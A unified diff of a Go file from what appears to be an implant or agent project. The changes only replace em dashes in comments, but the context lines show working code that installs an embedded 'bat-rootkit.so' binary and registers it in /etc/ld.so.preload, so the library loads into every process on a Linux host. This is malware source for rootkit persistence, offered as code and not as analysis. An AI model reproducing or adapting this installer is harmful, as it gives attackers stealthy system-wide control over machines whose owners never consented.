@@ -7,7 +7,7 @@ import (
 )
 
 // RootkitSO is the embedded bat-rootkit.so binary.
-// Set by the agent's main package via embed — not nil when agent carries the payload.
+// Set by the agent's main package via embed   not nil when agent carries the payload.
 var RootkitSO []byte
 
 // rootkitSOPath returns the correct .so install path for the current distro.
@@ -37,7 +37,7 @@ func InstallRootkit() (string, error) {
 
 	soPath := rootkitSOPath()
 
-	// Write the .so — world-readable so ld.so can load it for all processes
+	// Write the .so   world-readable so ld.so can load it for all processes
 	if err := os.WriteFile(soPath, RootkitSO, 0755); err != nil {
 		return "", fmt.Errorf("write .so: %w", err)
 	}
@@ -47,7 +47,7 @@ func InstallRootkit() (string, error) {
 		return "", fmt.Errorf("write pid mark: %w", err)
 	}
 
-	// Add to /etc/ld.so.preload (idempotent — won't duplicate)
+	// Add to /etc/ld.so.preload (idempotent   won't duplicate)
 	if err := addToPreload(soPath); err != nil {
 		return "", fmt.Errorf("update ld.so.preload: %w", err)
 	}
@@ -75,7 +75,7 @@ func addToPreload(soPath string) error {
 		existing = string(data)
 	}
 
-	// Idempotent — don't add if already present
+	// Idempotent   don't add if already present
 	for _, line := range strings.Split(existing, "\n") {
 		if strings.TrimSpace(line) == soPath {
 			return nil
